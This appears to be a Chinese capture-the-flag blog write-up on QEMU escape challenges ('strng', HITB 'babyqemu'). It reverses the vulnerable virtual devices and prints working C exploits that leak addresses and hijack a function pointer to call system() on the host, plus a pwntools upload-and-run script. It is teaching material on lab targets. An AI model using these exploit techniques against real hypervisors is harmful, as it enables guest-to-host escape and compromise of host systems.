<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">  *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR</span><br><span class="line">| O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">    die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">  mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">  mmio_read(<span class="number">0x1f0000</span>);</span><br><span class="line">  mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br><span class="line">  mmio_write(<span class="number">0x2f0000</span>, <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个脚本是 <strong>winmt</strong> 师傅写的，整体思路就是先获取 <code>MMIO</code> 的起始地址，然后进行一次读，两次写的操作，以此来触发回调函数，最终触发了 <code>system(&quot;cat flag&quot;)</code> 。因为这个 <code>qemu_system</code> 程序还是跑在宿主机上的，所以在这个程序中执行 <code>system(&quot;cat flag&quot;)</code> 读取的是宿主机的 <code>flag</code> 从而完成的逃逸，这和 <code>glibc</code> 的题目获取 <code>shell</code> 其实一样，不过最初我以为这个 <code>qemu_system</code> 程序就是在 <code>qemu</code> 里面，所以执行了 <code>system</code> 也是在 <code>qemu</code> 里面所执行的。 </p>
<p>上面这个脚本用 <code>musl-gcc</code> 所编译为静态链接的程序（用 <code>musl-gcc</code> 编译是因为这样生成的程序体积更小，静态链接的程序是因为远程环境有时候没有动态链接库）</p>
<p>编译命令为 <code>musl-gcc exp.c -o exp -static</code> <strong>（ <code>musl-gcc</code> 的编译与配置写到了文末 奇奇怪怪的技能 部分）</strong></p>
<p>如果打远程的话，则需要使用上传脚本（如下，这依然是 <strong>winmt</strong> 师傅所编写的）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25692</span>)</span><br><span class="line">os.system(<span class="string">&quot;gzip -c ./exp &gt; ./exp.gz&quot;</span>)<span class="comment">#将c脚本编译并命名为 exp</span></span><br><span class="line">os.system(<span class="string">&quot;base64 ./exp.gz &gt; ./b64_exp&quot;</span>)</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">content = fd.read()</span><br><span class="line">length = <span class="built_in">len</span>(content)</span><br><span class="line">fd.close()</span><br><span class="line">per_length = <span class="number">0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, per_length) :</span><br><span class="line">	cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : i + per_length] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line"><span class="keyword">if</span> length - i &gt; <span class="number">0</span> :</span><br><span class="line">	cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : length + <span class="number">1</span>] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;base64 -d ./b64_exp &gt; ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;gunzip ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;chmod +x ./exp&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261430662.png" alt="image-20230226143001990" style="zoom:50%;" />



<h3 id="strng"><a href="#strng" class="headerlink" title="strng"></a>strng</h3><p>这个的题目链接在 <a href="https://github.com/rcvalle/blizzardctf2017/releases">这里</a></p>
<p>然后启动脚本用这个 ，自己创建一个 <code>launch.sh</code> 文件就行（通过这个启动脚本可以发现，这个设备名叫做 <code>strng</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure>

<p>启动之后，发现这模拟的是一个 <code>ubuntu</code> 虚拟机，然后登录的用户名是 <code>ubuntu</code> ， 密码是 <code>passw0rd</code> 。</p>
<h4 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h4><p>这个 <code>qemu-system-x86_64</code> 没有去除符号表，但是开了 <code>PIE</code> 。我们的逆向思路是去搜索函数名中存在 <code>strng</code> 字符串的函数，这样可以更快定位到关键函数。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011317071.png" alt="image-20230301131745963" style="zoom:50%;" />



<p>我们从 <code>strng_class_init</code> 函数入手分析（如下），根据这里的数据可以分析出来设备号</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011318907.png" alt="image-20230301131847811" style="zoom:50%;" />



<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011329170.png" alt="image-20230301132945008" style="zoom:50%;" />

<p>如上，可以知道 <code>strng</code> 的设备为 <code>00:03:0</code></p>
<p>然后来依次分析 <code>strng_mmio_read</code>  <code>strng_mmio_write</code> <code>strng_pmio_read</code> <code>strng_pmio_write</code> 这四个函数，在分析之前，需要把这四个函数的第一个参数 <code>opaque</code> 的类型改为 <code>STRNGState *</code> ，这样可以让 <code>ida</code> 识别出来这个结构体，至于为什么这里要修改成 <code>STRNGState *</code>  类型，个人猜测可能这个位置正常的参数类型就是 <code>xxxState *</code> （ <code>xxx</code> 是设备名）</p>
<p> <code>STRNGState</code> 的结构体定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure>





<p><code>strng_mmio_read</code> 函数中如果满足 <code>if</code> 的话就返回 <code>regs</code> 数组里的值， </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011442913.png" alt="image-20230301144200823"></p>
<p><code>strng_mmio_write</code> 函数是用 <code>judge</code> 做了三个选择，如果 <code>judge</code> 为 <code>0</code> 就执行结构体中的 <code>srand(val)</code> ，如果为 <code>1</code> 则执行 <code>rand()</code>，如果 <code>judge</code> 为 <code>3</code> 就执行  <code>rand_r(&amp;strng-&gt;regs[2])</code> 以及 <code>regs[judge] = val</code> ，否则的话 <code>judge</code> 存在但不为 <code>3</code> ，就执行 <code>regs[judge] = val</code>。这里是存在一个 <code>regs</code> 数组的任意赋值的，索引和参数都可控</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011451484.png" alt="image-20230301145112412" style="zoom:50%;" />



<p><code>strng_pmio_read</code> 函数存在一个任意地址读，以此来泄露结构体中 <code>regs</code> 数组下面的函数地址。正常来说的话 <code>mmio_read</code> 函数那里的任意地址读，也是可以完成的，但是实践了一下，一直没办法用 <code>mmio_read</code> 泄露出来 <code>libc</code> 数据</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011534573.png" alt="image-20230301153424430" style="zoom:50%;" />



<p><code>strng_pmio_write</code> 函数最重要的有三个点，第一是 <code>opaque-&gt;addr</code> 可控，方便其他几个函数用这个 <code>opaque-&gt;addr</code> 进行利用 ，第二是 <code>v5</code> 为 <code>3</code> 的话，那么执行 <code>rand_r</code> 函数，并且参数为 <code>opaque-&gt;regs[2]</code> ， <code>v5</code> 存在且不为 <code>3</code> 的话，可以利用 <code>regs[v5]=val</code> 实现任意地址写，并且这里的索引可以溢出（可能是因为这个 <code>v5</code> 是 <code>opaque-&gt;addr</code> 来确定的？）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011543310.png" alt="image-20230301154347221" style="zoom:50%;" />



<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>我们可以利用 <code>strng_pmio_write</code> 函数的任意写，来篡改 <code>rand_r</code> 这个函数指针，从而劫持程序的执行流，而这个函数的参数是 <code>regs[2]</code> ，我们可以利用 <code>strng_mmio_write</code> 函数来向 <code>regs[2]</code> 以及之后的内存单元写入数据（也就是布置我们的参数），泄露 <code>libc</code> 地址的话，可以用 <code>strng_pmio_read</code> 函数来进行泄露。</p>
<p>然后我这里采用的是弹一个计算器，其字符串为 <code>gnome-calculator</code>（执行<code>/bin/sh</code> 应该是没法交互的，可能反弹 <code>shell</code> 可以？）</p>
<p>补充：</p>
<p><code>PMIO_BASE</code> 的地址查看命令是 <code>lspci -v</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011630743.png" alt="image-20230301163055688"></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint32_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val )</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *)(mmio_mem + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val,addr+PMIO_BASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">   <span class="comment">//iopl函数来提升IO的等级，否则这个pmio使用的是有问题的</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    mmio_write(<span class="number">2</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">3</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0x3b414141</span>);</span><br><span class="line">    mmio_write(<span class="number">5</span>,<span class="number">0x6d6f6e67</span>);   <span class="comment">// regs[2]</span></span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">0x61632d65</span>);  <span class="comment">// regs[3]</span></span><br><span class="line">    mmio_write(<span class="number">7</span>,<span class="number">0x6c75636c</span>);  <span class="comment">// regs[4]</span></span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x726f7461</span>);  <span class="comment">// regs[5]</span></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x118</span>);<span class="comment">//set opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> high_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    <span class="type">uint64_t</span> low_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> rand_r_addr=low_addr+(high_addr&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;low addr @ %llx\n&quot;</span>,low_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;high addr @ %llx\n&quot;</span>,high_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r function address @ %llx\n&quot;</span>,rand_r_addr);</span><br><span class="line">    <span class="type">uint64_t</span> system_addr=rand_r_addr+<span class="number">0xb080</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system function address @ %llx\n&quot;</span>,system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------tigger system----------------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0xc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011626104.png" alt="image-20230301162602101"></p>
<h4 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h4><p>因为上面发现 <code>mmio_read</code> 和 <code>mmio_write</code> 函数都无法索引溢出，尽管看起来 <code>qemu-system-x86_64</code> 程序中没有做任何的检查，但尝试了一下，数组越界访问的话确实是有点问题。然后看了一个师傅的解释，大概是下面的这个意思</p>
<p><code>MMIO</code> 和 <code>PMIO</code> 的空间大小是由 <code>pci_xxx_realize</code> 函数中注册的。</p>
<p>本题这里标明了 <code>MMIO</code> 的大小是 <code>0x100</code>  </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302281045546.png" alt="image-20230228104514364"></p>
<p>本地的 <code>regs</code> 数组大小就是 <code>0x100</code> ，所以这里是无法通过数组溢出覆盖到下面的函数指针的。因为 <code>pci</code> 设备内部会进程检查</p>
<h3 id="HITB-GSEC2017-BABYQEMU"><a href="#HITB-GSEC2017-BABYQEMU" class="headerlink" title="[HITB GSEC2017]BABYQEMU"></a>[HITB GSEC2017]BABYQEMU</h3><p>附件在 <code>buu</code> 上可以搜到</p>
<p>通过分析 <code>launch.sh</code> 文件得知这次的设备叫做 <code>hitb</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>我用的 <code>ubuntu18.04</code> ，然后运行 <code>launch.sh</code> 的时候有如下报错</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041237815.png" alt="image-20230304123706649"></p>
<p>解决方法：执行 <code>sudo apt install libcurl3</code></p>
<p>然后发现登录上去的时候询问用户名和密码</p>
<p>我们用如下命令，来将 <code>rootfs.cpio</code> 文件解压缩，然后我们去 <code>etc</code> 目录下，查看 <code>shadow</code> 文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">cpio -idv &lt; /home/zikh/Desktop/pwn_qemu/rootfs.cpio</span><br><span class="line">cd etc</span><br><span class="line">cat shadow</span><br></pre></td></tr></table></figure>



<p>发现如果用户名为 <code>root</code> 的话，后面的密码为空（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303021733038.png" alt="image-20230302173323824"></p>
<p>因此在登录的时候，用户名输入为 <code>root</code> 即可登录成功（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041306416.png" alt="image-20230304130630554" style="zoom:50%;" />



<h4 id="代码逆向-1"><a href="#代码逆向-1" class="headerlink" title="代码逆向"></a>代码逆向</h4><p>首先在 <code>hitb_class_init</code> 函数中确定设备号</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041308293.png" alt="image-20230304130826234" style="zoom:50%;" />

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041309270.png" alt="image-20230304130955192"></p>
<p>结合上面两个图片可以分析出 <code>00:04:0</code> 是 <code>hitb</code> 的设备号。</p>
<p>本题没有 <code>pmio</code> 的函数，但是有 <code>mmio</code> 的两个函数以及 <code>dma_timer</code> 。</p>
<p>简单分析下这三个函数</p>
<p>首先看 <code>hitb_mmio_read</code> 函数（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041321559.png" alt="image-20230304132100421"></p>
<p>这个比较明显，函数就是让你选择不同的 <code>addr</code> 然后用 <code>return</code> 返回结构体的不同字段。想显示结构体的字段的话，需要将 <code>opaque</code> 的类型改为 <code>HitbState *</code> （这是 <code>qemu</code> 逃逸的第三道题了，给我的感觉是通常漏洞都发生在数组索引越界上），这个 <code>mmio_read</code> 函数并没有用到索引来访问成员，所以这里简单看一下发现是没什么问题的。</p>
<p>其次是 <code>hitb_mmio_write</code> 函数（如下），这里就是让根据不同的 <code>addr</code> 然后给结构体不同的字段进行赋值，其值为 <code>val</code>。这里也没有通过数组的索引来访问成员，看起来也是安全的。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041325990.png" alt="image-20230304132554889" style="zoom: 67%;" />



<p>不过这里要关注一下 <code>timer_mod</code> 函数 </p>
<p>该函数的大致意思是说当超过 <code>expire_time</code> 这个时间时会触发定时器中断，其处理函数是 <code>ts</code> 结构体中的 <code>cb</code> 参数指定的函数，在 <code>pci_hitb_realize</code> 函数中的 <code>timer_init_tl</code> 函数里面将 <code>hitb_dma_timer</code> 函数赋值给了 <code>ts</code> 结构体中的 <code>cb</code> （ <code>call back</code> ）。因此我们添加 <code>sleep</code> 函数，让其超过 <code>expire_time</code> ，从而调用 <code>hitb_dma_timer</code> 函数</p>
<p>最后来看下 <code>hitb_dma_timer</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041434536.png" alt="image-20230304143404417"></p>
<p>这里就有我们心心念念的数组索引了，而且我们能够发现这里的索引 <code>v2</code> 是没有做任何检查的，并且它是被 <code>opaque-&gt;dma.src</code> 所控制，这个 <code>dma.src</code> 是在 <code>hitb_mmio_write</code> 函数可以被我们控制的，所以这里 <code>dma_buf[v2]</code> 是存在索引溢出的。</p>
<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>重点看下 <code>cpu_physical_memory_rw</code> 函数</p>
<blockquote>
<p><code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf,int len, int is_write)</code> 函数是 <code>QEMU</code> 虚拟机监视器中一个用于读写物理内存的函数。该函数的作用是在虚拟机中读写指定地址的物理内存，并将读取或写入的数据存储在给定的缓冲区中。它的参数如下：</p>
<ul>
<li><code>hwaddr addr</code>：一个表示物理内存地址的无符号整数类型。需要读写的物理地址。</li>
<li><code>uint8_t *buf</code>：一个指向要读取或写入数据的缓冲区的指针。数据存储在这里。</li>
<li><code>int len</code>：一个整数，表示要读取或写入数据的长度。</li>
<li><code>int is_write</code>：一个整数，表示操作是读取（0）还是写入（非0）操作。</li>
</ul>
</blockquote>
<p>以这行代码为例 <code>cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, 1);</code>  ，其作用是将 <code>cnt_low</code> 写入物理内存 <code>opaque-&gt;dma.dst</code> 的位置（ <code>qemu</code> 中的物理内存 ）,写入的字节数为 <code>opaque-&gt;dma.cnt</code> 。</p>
<p><code>cnt_low</code> 是由 <code>(uint8_t *)&amp;opaque-&gt;dma_buf[v2]</code> 所赋值的，我们上面提到了 <code>dma_buf</code> 数组存在索引溢出，现在来看下比 <code>dma_buf</code> 低的位置有没有什么可用的（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820030.png" alt="image-20230304162135975" style="zoom: 50%;" />

<p>发现了 <code>dma_buf</code> 下面紧挨着的就是 <code>enc</code> 这个函数地址，因此我们可以让 <code>v2</code> 溢出，让其 <code>dma_buf[v2]</code> 指向 <code>enc</code> ，接着执行 <code>cpu_physical_memory_rw</code> 函数，这样 <code>enc</code> 函数的地址就会被写入到 <code>opaque-&gt;dma.dst</code> 指向的内存，也就是说只要让 <code>opaque-&gt;dma.dst</code> 为我们能够访问的物理内存，执行完这个函数后，我们就可以通过打印这个物理内存所对应的变量就能获取程序基地址</p>
<p>搜索一下发现，本题是有 <code>system</code> 函数的，所以只要拿到程序里函数的地址，用固定偏移就可以得到 <code>system</code> 函数的地址。</p>
<p>**注意：<code>cpu_physical_memory_rw</code> 函数的第一个参数需要的是物理地址，所以需要将 <code>qemu</code> 中的虚拟内存转换为物理地址，具体转换的方法可以参考文末的 <code>qemu</code> 中的虚拟内存与物理内存部分 ** </p>
<p>这里的 <code>exp</code> 如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> enc_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line"><span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br></pre></td></tr></table></figure>

